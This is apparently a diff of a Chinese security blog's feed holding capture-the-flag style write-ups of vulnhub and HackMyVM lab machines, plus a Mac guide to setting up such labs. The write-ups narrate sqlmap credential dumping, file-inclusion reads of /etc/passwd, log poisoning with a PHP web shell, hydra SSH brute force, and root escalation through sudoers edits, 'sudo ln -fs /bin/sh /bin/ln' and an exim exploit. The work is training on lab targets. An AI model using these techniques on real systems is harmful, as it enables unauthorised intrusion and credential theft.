 <h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>发现有一个登录界面 用户名是admin 用bp爆破无法得到正确的密码<br>并且search有一个输入框<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/f81f33ccbd3d01ca.png" alt="|425"><img src="https://s3.bmp.ovh/imgs/2025/01/29/7a426990d44cebb4.png" alt="|475"><br>这个搜索框是一个post请求  在这里可以使用sqlmap进行sql注入<br>在这里我们使用-u 和 –data “search&#x3D;1” 这里是post类型注入 自动画操作再加上–batch<br>查询之后 在上一条指令后面加上–dbs就可以查到数据库<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/f9bc162ab156b944.png" alt="|525"><br>一步一步扫描 刚才是数据库 现在就是指定数据库 查表 后面就是查列<br>-D users –tables  - T *** –columns<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/158b8293575e9909.png" alt="|400"><br>现在要查询用户名和密码字段 用-C “username,password” –dump<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/340563e3e3b4f104.png" alt="|350"><br>找到一系列用户名和密码<br>然后我们定位到csv文件里 用awk 做一个分割  分别存进user.txt pass.txt<br>现在这里没有类似admin之类的用户 我们现在去另外一个数据库里继续查询<br>然后可以发现一个admin用户  将md5放在网站中破解<br>得到密码之后 可以登录网站的manager界面 在添加记录这里尝试添加’ # 看看有没有报错<br>发现在邮箱这边确实会出现报错<br><img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b1.png"><br> 同时还可以看到不存在 –&gt; 文件包含漏洞<br> <img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b2.png"><br> <mark>下一步就要用web登录到服务器</mark><br> 我们在url这里输入?file&#x3D; ..&#x2F;..&#x2F;etc&#x2F;passwd 一直尝试相对路径<br> 接着用bp来获取他的真实路径   在bp浏览器中登录管理员账户<br> <img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b3.png"><br> 在bp包中把file&#x3D;后面加上$  然后在payload里面加上相对路径<br> <img src="https://pic1.imgdb.cn/item/6799dc7ed0e0a243d4f870b4.png" alt="|500"><br> 根据返回的长度就可以得到真实路径<br> <img src="https://pic1.imgdb.cn/item/6799dc7ed0e0a243d4f870b5.png" alt="|500"><br> 然后我们到真实的路径下面 因为知道有ssh服务 所以可以查看ssh配置文件  发现不允许root登录 listen也没有配置<br> 因为之前我们知道22端口被防火墙过滤了 我们猜测有knockd服务 在&#x2F;proc&#x2F;sched_debug 里面可以看到所以配置的服务<br> <img src="https://pic1.imgdb.cn/item/6799dce1d0e0a243d4f870ba.png" alt="|475"><br> 把这些信息都放到kali a.txt 用正则表达式过滤 cat a.txt | egrep ‘[a-zA-z]+’ 这样子可以搜索服务 -o输出匹配内容 在sort排序 （还可以uniq去重） 发现有knockd这个服务<br> 然后访问etc&#x2F;knockd.conf<br> <img src="https://pic1.imgdb.cn/item/6799dce1d0e0a243d4f870bb.png"><br> 可以看到knock服务的访问顺序是 9842 8475 7469   然后用nc或者kali自带的knock(注意没有d来访问<br> 然后我们就发现这个22端口现在已经开放了<br> 现在用刚才的user 和 pass文件  用hydra爆破<br> hydra -L user.txt -P pass.txt ssh:&#x2F;&#x2F;192.168.240.171</p>
 <h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>然后拿到一些普通用户 我们进去看看有什么文件<br><img src="https://pic1.imgdb.cn/item/6799ddc3d0e0a243d4f870cc.png" alt="|475"><br>登录之后没有发现什么任何文件<br><img src="https://pic1.imgdb.cn/item/6799ddc3d0e0a243d4f870cd.png" alt="|450"><br>我们要输入<mark>sudo -l</mark> 查看是否有什么文件夹有root权限 发现这个用户什么都没有<br>登录到最后一个账户里面发现有一个新的文件 里面有新的密码<br><img src="https://pic1.imgdb.cn/item/6799dce5d0e0a243d4f870bd.png" alt="|475"><br>把这些密码放到pass.txt 中 再用hydra 跑一遍<br>登入到新的用户<br>输入root -l 之后发现有一个root组的文件<br><img src="https://pic1.imgdb.cn/item/6799dce4d0e0a243d4f870bc.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/6799dce6d0e0a243d4f870be.png" alt="|375"><br>这个脚本接受两个参数 读第一个文件的内容 然后添加到第二个文件里<br>我们现在就加到etc&#x2F;sudoers 添加权限   现在就新建一个文件夹 然后添加root的权限(ALL&#x3D;(ALL:ALL) ALL)<br>这里我们要在主文件夹下面写这个文件  因为刚才test脚本在的地方是有root权限的<br>然后用刚才的脚本把a.txt 写入 etc&#x2F;sudoers<br>输入sudo su -<br><img src="https://pic1.imgdb.cn/item/6799dd8bd0e0a243d4f870c9.png" alt="|400"><br>解决！！</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">codeblock</span></span><br></pre></td></tr></table></figure></div>]]></content>
-      <categories>
-        <category>靶场</category>
-        <category>vulnhub</category>
-      </categories>
-      <tags>
-        <tag>渗透</tag>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>DC5靶场复盘</title>
-    <url>/posts/19078.html</url>
-    <content><![CDATA[<p>vulnhub-DC5靶场复盘</p>
-<span id="more"></span>
-<h2 id="端口探测"><a href="#端口探测" class="headerlink" title="端口探测"></a>端口探测</h2><p>这题的靶场提示要在web找到刷新改变的东西<br><img src="https://pic1.imgdb.cn/item/679a1f6ed0e0a243d4f87639.png"><br>这个靶机只有一个80端口 没有22ssh端口<br>而且这个网站没有用cms  是一个静态的页面</p>
-<h2 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h2><p>在contact us 里有输入框 用sqlmap 扫描之后没有注入点<br>在contact us 输入内容返回的thank you.php 界面刷新 发现下面的footer会刷新 查看页面源代码<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763a.png" alt="|450"><br>这个界面是有一个footer.php的 所以这里有一个文件包含漏洞  因为是其他有调用这个footer.php<br>但是现在不知道用什么关键字访问到包含文件  所以我们用wfuzz跑关键字<br><img src="https://pic1.imgdb.cn/item/679a1f6fd0e0a243d4f8763b.png" alt="|575"><br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png"><br>找到了关键字是file  现在就可以访问服务器中的文件了   <strong>现在的又一个难题是只能看到文件如何才能拿到shell呢</strong><br>我们知道如果可以写入一个一句话木马就可以拿到shell   但是应该用什么方式实现呢？<br>用apache2服务访问的日志 错误日志也会存 存在&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log 中  这里没有我们就用nginx<br>下一步就是用bp修改<br><img src="https://pic1.imgdb.cn/item/679a1f70d0e0a243d4f8763c.png" alt="|425"><br>这一条记录会在access.log中<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763e.png"><br>我们的标记存在 而且后面的php代码没有显示出来 说明被成功解析了  用蚁剑连接shell</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>在上一步拿到蚁剑的shell之后反弹到本机中<br>提权思路还是找到存在漏洞的服务<br><img src="https://pic1.imgdb.cn/item/679a1f98d0e0a243d4f8763f.png" alt="|450"><br>这里有一个screen服务而且告诉了版本号 大概率就是利用这个<br>然后用wget 从靶机下载本机的这个脚本  <mark>注意这个脚本不能再www目录下运行  在其他目录下wget</mark><br>运行之后拿到root权限 解决！！！ </p>
-]]></content>
       <categories>
         <category>靶场</category>
         <category>vulnhub</category>
@@ -1546,6 +1573,65 @@ root@flower:/#
       <tags>
         <tag>渗透</tag>
         <tag>HMV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HMV-helium</title>
+    <url>/posts/43260.html</url>
+    <content><![CDATA[<p>HMV-helium靶场复盘</p>
+<span id="more"></span>
+<p><img src="https://pic1.imgdb.cn/item/679f6263d0e0a243d4f99728.png"></p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.240.53 </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">02</span> <span class="number">20</span>:<span class="number">18</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.53</span></span><br><span class="line">Host is up (<span class="number">0.0020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">12</span>:f6:<span class="number">55</span>:<span class="number">5</span>f:c6:fa:fb:<span class="number">14</span>:<span class="number">15</span>:ae:<span class="number">4</span>a:<span class="number">2</span>b:<span class="number">38</span>:d8:<span class="number">4</span>a:<span class="number">30</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> b7:ac:<span class="number">87</span>:<span class="number">6</span>d:c4:f9:e3:<span class="number">9</span>a:d4:<span class="number">6</span>e:e0:<span class="number">4</span>f:da:aa:<span class="number">22</span>:<span class="number">20</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> fe:e8:<span class="number">05</span>:af:<span class="number">23</span>:<span class="number">4</span>d:<span class="number">3</span>a:<span class="number">82</span>:<span class="number">2</span>a:<span class="number">64</span>:<span class="number">9</span>b:f7:<span class="number">35</span>:e4:<span class="number">44</span>:<span class="number">4</span>a (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> RELAX</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">56</span>:BD:<span class="number">76</span>:<span class="number">3</span>F:EB:<span class="number">82</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.03</span> ms <span class="number">192.168</span>.<span class="number">240.53</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.43</span> seconds</span><br></pre></td></tr></table></figure></div>
+<p>开放22和80端口 直接进入web部分</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://192.168.240.53         </span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>RELAX<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!doctype <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- Please paul, stop uploading weird .wav files using /upload_sound --&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css"><span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-image</span>: <span class="built_in">url</span>(<span class="string">&#x27;screen-1.jpg&#x27;</span>);</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-repeat</span>: no-repeat;</span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-attachment</span>: fixed; </span></span><br><span class="line"><span class="language-css">  <span class="attribute">background-size</span>: <span class="number">100%</span> <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">&#125;</span></span><br><span class="line"><span class="language-css"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">href</span>=<span class="string">&quot;bootstrap.min.css&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">audio</span> <span class="attr">src</span>=<span class="string">&quot;relax.wav&quot;</span> <span class="attr">preload</span>=<span class="string">&quot;auto loop&quot;</span> <span class="attr">controls</span>&gt;</span><span class="tag">&lt;/<span class="name">audio</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
+<p>这里告诉了一个用户名paul 还有一个目录&#x2F;upload_sound 还有一个relax.wav可以下载<br>以为是wav隐写有关，但是我对misc不是很熟悉，也捣鼓了这个wav半天没有信息，结果是我搞错方向了<br>这个源码中的bootstrap.min.css可以访问，有一个wav文件，实际上要分析的是这个wav文件</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# curl http://192.168.240.53/bootstrap.min.css    </span><br><span class="line">/yay/mysecretsound.wav</span><br></pre></td></tr></table></figure></div>
+<p>打开audacity选择频谱 可以看到有文字出现 这个就是密码<br><img src="/2"><br><img src="/3"><br>dancingpassyo<br>成功拿到用户shell</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─# ssh paul@<span class="number">192.168</span>.<span class="number">240.53</span>                     </span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;192.168.240.53 (192.168.240.53)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:y4b6laUdkY6jY95p0UousHuja503C9EIqNNrMD5hoqA.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;192.168.240.53&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">paul@<span class="number">192.168</span>.<span class="number">240.53</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Permission denied, please <span class="keyword">try</span> again.</span><br><span class="line">paul@<span class="number">192.168</span>.<span class="number">240.53</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux helium <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">12</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">152</span>-<span class="number">1</span> (<span class="number">2020</span>-<span class="number">10</span>-<span class="number">18</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Sun Nov <span class="number">22</span> <span class="number">14</span>:<span class="number">31</span>:<span class="number">51</span> <span class="number">2020</span> <span class="keyword">from</span> <span class="number">192.168</span>.<span class="number">1.58</span></span><br><span class="line">paul@helium:~$ </span><br></pre></td></tr></table></figure></div>
+
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>有一个sudo权限 可以执行一个程序</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> paul on <span class="symbol">helium:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> paul may run the following commands on <span class="symbol">helium:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/ln</span><br><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>file /usr/bin/ln</span><br><span class="line">/usr/bin/<span class="symbol">ln:</span> <span class="title class_">ELF</span> <span class="number">64</span>-bit <span class="title class_">LSB</span> pie executable, x86<span class="number">-64</span>, version <span class="number">1</span> (<span class="title class_">SYSV</span>), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64</span>.so.<span class="number">2</span>, <span class="keyword">for</span> <span class="title class_">GNU</span>/<span class="title class_">Linux</span> <span class="number">3.2</span>.<span class="number">0</span>, <span class="title class_">BuildID</span>[sha1]=<span class="number">90900</span>bc68d91aa5931e338d6445b520777431a02, stripped</span><br></pre></td></tr></table></figure></div>
+<p>找到提权命令</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span> -fs /bin/sh /bin/ln</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">ln</span></span><br></pre></td></tr></table></figure></div>
+<p>拿到rootshell  解决</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>sudo ln -fd /bin/bash /bin/ln</span><br><span class="line">paul<span class="variable">@helium</span><span class="symbol">:~</span><span class="variable">$ </span>sudo ln</span><br><span class="line">root<span class="variable">@helium</span><span class="symbol">:/home/paul</span><span class="comment"># </span></span><br></pre></td></tr></table></figure></div>
+<h2 id="提权命令解释"><a href="#提权命令解释" class="headerlink" title="提权命令解释"></a>提权命令解释</h2><p>📌 ln 命令解释<br>ln 是 Linux 系统中的 创建链接命令，用于创建 硬链接 或 符号链接（软链接）。</p>
+<p>🔍 ln 命令的基本用法</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ln</span> [选项] 目标文件 目标链接</span><br></pre></td></tr></table></figure></div>
+<p>硬链接（默认）：不使用 -s，创建一个指向同一 inode 的文件。<br>符号链接（软链接）：使用 -s，创建一个指向目标文件路径的快捷方式。</p>
+<h3 id="sudo-ln-fs-bin-sh-bin-ln-解析"><a href="#sudo-ln-fs-bin-sh-bin-ln-解析" class="headerlink" title="sudo ln -fs &#x2F;bin&#x2F;sh &#x2F;bin&#x2F;ln 解析"></a>sudo ln -fs &#x2F;bin&#x2F;sh &#x2F;bin&#x2F;ln 解析</h3><p>这条命令的作用是 用 &#x2F;bin&#x2F;sh 替换 &#x2F;bin&#x2F;ln，并且强制创建符号链接。</p>
+<h4 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h4><p>ln 命令用于 创建硬链接或符号链接，在这里用于 替换系统的 ln 命令。</p>
+<h4 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h4><p>-f 选项 强制覆盖 目标文件（如果 &#x2F;bin&#x2F;ln 已经存在，它会被替换）。</p>
+<h4 id="s"><a href="#s" class="headerlink" title="-s"></a>-s</h4><p>-s 选项 创建符号链接（软链接，而不是硬链接）。</p>
+<h4 id="bin-sh"><a href="#bin-sh" class="headerlink" title="&#x2F;bin&#x2F;sh"></a>&#x2F;bin&#x2F;sh</h4><p>&#x2F;bin&#x2F;sh 是目标文件，ln 命令会创建一个指向 &#x2F;bin&#x2F;sh 的符号链接。</p>
+<h4 id="bin-ln"><a href="#bin-ln" class="headerlink" title="&#x2F;bin&#x2F;ln"></a>&#x2F;bin&#x2F;ln</h4><p>&#x2F;bin&#x2F;ln 是目标路径，执行后 &#x2F;bin&#x2F;ln 变成了 &#x2F;bin&#x2F;sh 的别名。</p>
+<p>由于 &#x2F;bin&#x2F;ln 现在指向 &#x2F;bin&#x2F;sh，所以 sudo ln 实际上等于 sudo &#x2F;bin&#x2F;sh。</p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>hmv</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>HMV</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC8靶场复盘</title>
+    <url>/posts/51727.html</url>
+    <content><![CDATA[<p>vulnhub-DC8靶场复盘</p>
+<span id="more"></span>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>这个主要考察从web端进入</p>
+<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>0.用dirsearch找到网页所有的目录  知道有mysql服务 暗示要sql注入  而且有robots.txt 其中有user&#x2F;login目录<br>1.在网页点击其他链接的时候看到url有参数 尝试注释闭合<br>发现有sql注入点<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87546.png" alt="|550"><br>2.用sqlmap得到管理员账号<br><img src="https://pic1.imgdb.cn/item/679a1620d0e0a243d4f87547.png" alt="|500"><br>最终找到两条记录 然后将这个hash放到一个目录用john 去跑 可以找到john的密码<br>3.登录网站管理员的账号<br>有一个edit选项 里面可以上传文件 但是无法上传php文件<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87548.png" alt="|500"><br>在contactus webform 发现可以修改用户上传之后的提示回显  并且可以用PHP代码 实验之后发现确实可以渲染php<br>现在可以用system指令来反弹shell<br><img src="https://pic1.imgdb.cn/item/679a1621d0e0a243d4f87549.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/679a1622d0e0a243d4f8754a.png"><br>这个指令可以在反弹的shell里面加上前缀 可以美化输出<br>随便看看这个用户目录下的文件 </p>
+<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null  意思从根目录开始找 所有者是root 只包括suid 的 然后将标准错误不输出<br><img src="https://pic1.imgdb.cn/item/679a1666d0e0a243d4f8754f.png" alt="|500"><br>这里利用exim提权（先查看这里exim4的版本  用searchsploit exim发现漏洞<br>然后把文件复制到&#x2F;var&#x2F;www&#x2F;html 下方便传输到受害机<br><img src="https://pic1.imgdb.cn/item/679a1669d0e0a243d4f87550.png" alt="|425"><br>在受害机上面用wget接受这个脚本<br><img src="https://pic1.imgdb.cn/item/679a166ad0e0a243d4f87551.png"><br><img src="https://pic1.imgdb.cn/item/679a166bd0e0a243d4f87552.png"><br>有两种方法使用这个脚本 选择第二种 因为 第二种在脚本说可以有一个shell<br>但是如果我们用 cat -A 查看这个a.sh 文件发现 末尾都是^M<br>用dos2unix转换之后 可以运行   bash a.sh -m netcat<br><img src="https://pic1.imgdb.cn/item/679a166cd0e0a243d4f87553.png" alt="|450"><br>发现成功提权 然后到&#x2F;root目录下 就解决！！ </p>
+]]></content>
+      <categories>
+        <category>靶场</category>
+        <category>vulnhub</category>
+      </categories>
+      <tags>
+        <tag>渗透</tag>
+        <tag>vulnhub</tag>
       </tags>
   </entry>
   <entry>
@@ -1712,50 +1798,6 @@ root@flower:/#
       </tags>
   </entry>
   <entry>
-    <title>mac环境靶场搭建</title>
-    <url>/posts/86.html</url>
-    <content><![CDATA[<p>Mac环境下靶场搭建</p>
-<span id="more"></span>
-<p>因为我是mac m芯片电脑，所以在安装靶场时候如果直接使用virtualbox会报错，这篇文章介绍了我安装靶场的解决方案</p>
-<h2 id="utm安装"><a href="#utm安装" class="headerlink" title="utm安装"></a>utm安装</h2><p>我使用的虚拟机是utm ，可以模拟x86系统，直接在官网免费下载<br><a href="https://mac.getutm.app/">https://mac.getutm.app/</a><br><img src="https://pic1.imgdb.cn/item/679a4c5cd0e0a243d4f87b67.png"></p>
-<h2 id="靶场安装包处理"><a href="#靶场安装包处理" class="headerlink" title="靶场安装包处理"></a>靶场安装包处理</h2><p>这里以从vulnhub下载的Deathnote为例<br>从靶场下来的安装包应该是.ovf<br>在终端用tar解压这个文件  解压得到两个文件 我们需要用的是.vmdk文件</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LLVM"><figure class="iseeu highlight /llvm"><table><tr><td class="code"><pre><span class="line">(base) kakeru<span class="title">@bogon</span> downloads % tar xvf Deathnote.ova </span><br><span class="line"><span class="keyword">x</span> Deathnote.ovf</span><br><span class="line"><span class="keyword">x</span> Deathnote-disk<span class="number">001</span>.vmdk</span><br><span class="line"><span class="keyword">x</span> Deathnote.mf</span><br></pre></td></tr></table></figure></div>
-
-<p>然后下载qemu  mac用户可以用brew下载</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MIPSASM"><figure class="iseeu highlight /mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">brew </span><span class="keyword">install </span>qemu</span><br></pre></td></tr></table></figure></div>
-<p>然后在靶场解压后的目录中执行</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STYLUS"><figure class="iseeu highlight /stylus"><table><tr><td class="code"><pre><span class="line">qemu-<span class="selector-tag">img</span> convert -<span class="selector-tag">p</span>  -O qcow2 Deathnote-disk001<span class="selector-class">.vmdk</span> Deathnote<span class="selector-class">.qcow2</span> </span><br></pre></td></tr></table></figure></div>
-<p>执行后把.vmdk 文件转换成.qcow2文件</p>
-<h2 id="utm设置"><a href="#utm设置" class="headerlink" title="utm设置"></a>utm设置</h2><p>点击创建虚拟机 –&gt;  模拟  –&gt; 其他 进入虚拟机配置<br><img src="https://pic1.imgdb.cn/item/679a4c5ed0e0a243d4f87b68.png"><br>启动设备选择无<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b69.png"><br>修改内存  一般虚拟只要分配1g以下的内存<br><img src="https://pic1.imgdb.cn/item/679a4c5fd0e0a243d4f87b6a.png"><br>然后可以给虚拟机起个名字 点击存储<br><img src="https://pic1.imgdb.cn/item/679a4c60d0e0a243d4f87b6b.png"><br>接着右击虚拟机,点击编辑，进入虚拟机设置<br>1.在QEMU中取消UEFI启动<br><img src="https://pic1.imgdb.cn/item/679a4c98d0e0a243d4f87b6e.png"><br>2.网络选择桥接(你可以自己配置网络，桥接是最简单的)<br><img src="https://pic1.imgdb.cn/item/679a4c9ad0e0a243d4f87b6f.png"><br>3.右击IDE驱动器,删除<br><img src="https://pic1.imgdb.cn/item/679a4c9bd0e0a243d4f87b70.png"><br>4.驱动器新建点击导入 ，选择我们刚刚转换的.qcow2文件</p>
